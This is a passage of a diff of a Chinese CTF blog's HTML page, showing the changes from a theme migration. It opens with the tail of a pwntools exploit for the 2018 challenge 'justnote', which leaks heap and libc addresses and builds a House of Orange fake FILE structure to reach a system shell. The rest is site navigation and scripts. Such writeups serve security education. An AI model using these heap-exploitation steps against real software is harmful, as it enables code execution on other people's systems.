+    fake_file +=  p64(0xffffffffffffffff)     #bypass fp-&gt;_mode &lt;= 0
+    fake_file += p64(0) * 2 
+    fake_file += p64(fake_file_addr + 0x60)        #vtable
+
+    return fake_file
+
+
+add(-9223372036854775808,&#39;a&#39;*8) #0
+add(100,&#39;b&#39;*8) #1
+add(-9223372036854775808,&#39;c&#39;*8) #2
+add(100,&#39;d&#39;*8) #3
+add(-9223372036854775808,&#39;e&#39;*8) #4
+add(100,&#39;d&#39;*8) #5
+add(100,&#39;d&#39;*8) #6
+delete(1)
+delete(3)
+pause()
+edit(0,&#39;\x00&#39;*0x108 + &#39;\x13&#39;)
+add(100,&#39;a&#39;*8)
+p.recvuntil(&quot;a&quot;*8)
+heap_addr = u64(p.recv(6).ljust(8,&#39;\x00&#39;))
+heap_base = heap_addr - 0x540
+log.info(&quot;heap address is {}&quot;.format(hex(heap_addr)))
+
+edit(2,&#39;\x00&#39;*0x108 + &#39;\x13&#39;)
+add(100,&#39;a&#39;*8)
+p.recvuntil(&quot;a&quot;*8)
+libc_base = u64(p.recv(6).ljust(8,&#39;\x00&#39;)) - libc.symbols[&#39;__malloc_hook&#39;] - 0x10 - 0x58
+log.info(&quot;libc address is {}&quot;.format(hex(libc_base)))
+libc.address = libc_base
+
+
+delete(5)
+edit(4, &#39;\x00&#39; * 0x100 + HouseOfOrange(heap_addr + 0x110 * 2, libc.sym[&#39;system&#39;], libc.sym[&#39;_IO_list_all&#39;]))
+p.recvuntil(&#39;choice: &#39;)
+p.sendline(&#39;1&#39;)
+p.interactive()
+</code></pre>
 <p>reference:</p>
 <p><a href="https://xz.aliyun.com/t/3315#toc-10" target="_blank" rel="noopener">高校运维赛 2018 Writeup – 天枢</a></p>
 
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-      <div>
-        
-
-
-
-
-  
-
-
-
-<ul class="post-copyright">
-  <li class="post-copyright-author">
-    <strong>本文作者： </strong>zs0zrc</li>
-  <li class="post-copyright-link">
-    <strong>本文链接：</strong>
-    
-    <a href="http://yoursite.com/2018/11/20/2018-11-20-2018-高校网络信息安全管理运维挑战赛-pwn-writeup/" title="2018-高校网络信息安全管理运维挑战赛-pwn-writeup">http://yoursite.com/2018/11/20/2018-11-20-2018-高校网络信息安全管理运维挑战赛-pwn-writeup/</a>
-  </li>
-  <li class="post-copyright-license">
-    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
-</ul>
-
-      </div>
-    
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/writeup/" rel="tag"># writeup</a>
-          
-            <a href="/tags/pwn/" rel="tag"># pwn</a>
-          
-        </div>
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2018/11/19/2018-11-19-SUCTF-招新赛-2018-writeup/" rel="next" title="SUCTF 招新赛 2018 writeup">
-                <i class="fa fa-chevron-left"></i> SUCTF 招新赛 2018 writeup
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/11/26/2018-11-26-Vulnhub-Billu_b0x-靶机的渗透测试学习记录/" rel="prev" title="Vulnhub-Billu_b0x 靶机的渗透测试学习记录">
-                Vulnhub-Billu_b0x 靶机的渗透测试学习记录 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-  </div>
-
-
-          </div>
-          
-
-  
-
-
-
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-            
-              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="zs0zrc">
-            
-              <p class="site-author-name" itemprop="name">zs0zrc</p>
-              <div class="site-description motion-element" itemprop="description">zs0zrc's blog</div>
-          </div>
-
-          
-            <nav class="site-state motion-element">
-              
-                <div class="site-state-item site-state-posts">
+            </div>
+            <hr>
+            <div>
+              <p>
                 
-                  <a href="/archives/">
-                
-                    <span class="site-state-item-count">53</span>
-                    <span class="site-state-item-name">日志</span>
-                  </a>
-                </div>
-              
-
-              
+                  <span>
+                <i class="iconfont icon-inbox"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF-s-writeup/">CTF&#39;s writeup</a>
+                      &nbsp;
+                    
+                  </span>&nbsp;&nbsp;
                 
                 
-                <div class="site-state-item site-state-categories">
-                  
+                  <span>
+                <i class="iconfont icon-tag"></i>
                     
-                      <a href="/categories/">
+                      <a class="hover-with-bg" href="/tags/writeup/">writeup</a>
                     
-                  
+                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
                     
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">13</span>
-                    <span class="site-state-item-name">分类</span>
-                  </a>
-                </div>
-              
-
-              
+                  </span>
                 
-                
-                <div class="site-state-item site-state-tags">
-                  
-                    
-                      <a href="/tags/">
-                    
-                  
-                    
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">20</span>
-                    <span class="site-state-item-name">标签</span>
-                  </a>
-                </div>
+              </p>
               
-            </nav>
-          
-
-          
-
-          
-
-          
-            <div class="links-of-author motion-element">
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="https://github.com/zszcr" title="GitHub &rarr; https://github.com/zszcr" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
-                </span>
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="https://twitter.com/1PFjclRQBHRAuEE" title="Twitter &rarr; https://twitter.com/1PFjclRQBHRAuEE" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
-                </span>
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
               
             </div>
-          
-
-          
-             <div class="cc-license motion-element" itemprop="license">
-              
-              
-                
-              
-              
-              
-              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
-             </div>
-          
-
-          
-          
-            <div class="links-of-blogroll motion-element links-of-blogroll-block">
-              <div class="links-of-blogroll-title">
-                <i class="fa  fa-fw fa-link"></i>
-                Links
-              </div>
-              <ul class="links-of-blogroll-list">
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://23r3f.github.io/" title="https://23r3f.github.io/" rel="noopener" target="_blank">23R3F</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://myhackerworld.top/" title="http://myhackerworld.top/" rel="noopener" target="_blank">D4rk3r</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://m4x.fun/" title="http://m4x.fun/" rel="noopener" target="_blank">M4X</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://n132.github.io/" title="https://n132.github.io/" rel="noopener" target="_blank">n13r</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://aluvion.github.io/" title="https://aluvion.github.io/" rel="noopener" target="_blank">Twings</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://littleredlie.github.io/" title="https://littleredlie.github.io/" rel="noopener" target="_blank">LittleRed</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://glarcy.github.io/" title="https://glarcy.github.io/" rel="noopener" target="_blank">Glarcy</a>
-                  </li>
-                
-              </ul>
-            </div>
-          
-
-          
-            
-          
-          
-
-        </div>
-      </div>
-
-      
-      <!--noindex-->
-        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
 
             
-            
-            
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#hack"><span class="nav-number">1.</span> <span class="nav-text">hack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#justnote"><span class="nav-number">2.</span> <span class="nav-text">justnote</span></a></li></ol></div>
-            
-
           </div>
         </div>
-      <!--/noindex-->
-      
-
-      
-
-    </div>
-  </aside>
-  
-
-
-        
       </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2020</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">zs0zrc</span>
-
-  
-
-  
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
 </div>
 
-
-  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.8.0</div>
-
-
-
-  <span class="post-meta-divider">|</span>
-
-
-
-  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.1.0</div>
-
-
-
-
-        
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
       </div>
     
+  </div>
+</div>
+
+<!-- Custom -->
+
 
     
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+  <div>
+    
+      <!-- 不蒜子统计PV -->
+      
+      <span id="busuanzi_container_site_pv" style="display: none">
+      总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    </span>
+    
+    
+      <!-- 不蒜子统计UV -->
+      
+      <span id="busuanzi_container_site_uv" style="display: none">
+      总访客数 <span id="busuanzi_value_site_uv"></span> 人
+    </span>
+    
+  </div>
+
 
     
 
     
   </div>
+</footer>
 
-  
-
-<script>
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
-</script>
-
-
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
+<script src="/js/main.js"></script>
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+  <script src="/js/lazyload.js"></script>
 
 
 
   
-  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var post = $('#post');
+      var toc = $('#toc');
+      var tocLimMax = post.offset().top + post.height() - navHeight;
 
-  
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
 
-  
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-
-  
-
-
-  <script src="/js/utils.js?v=7.1.0"></script>
-
-  <script src="/js/motion.js?v=7.1.0"></script>
-
-
-
-  
-  
-
-
-  <script src="/js/affix.js?v=7.1.0"></script>
-
-  <script src="/js/schemes/pisces.js?v=7.1.0"></script>
-
-
-
-  
-  <script src="/js/scrollspy.js?v=7.1.0"></script>
-<script src="/js/post-details.js?v=7.1.0"></script>
-
-
-
-  
-
-
-  <script src="/js/next-boot.js?v=7.1.0"></script>
-
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-
-  
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = $('#board-ctn').css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
 
 
 
 
-  
 
-  
 
-  
 
-  
+  <script defer src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
-  
 
-  
 
-  
 
-  
+<!-- Plugins -->
 
-  
 
-  
 
-  
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
 
-  
 
-  
 
-  
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "2018-高校网络信息安全管理运维挑战赛-pwn-writeup&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
 
 </body>
 </html>
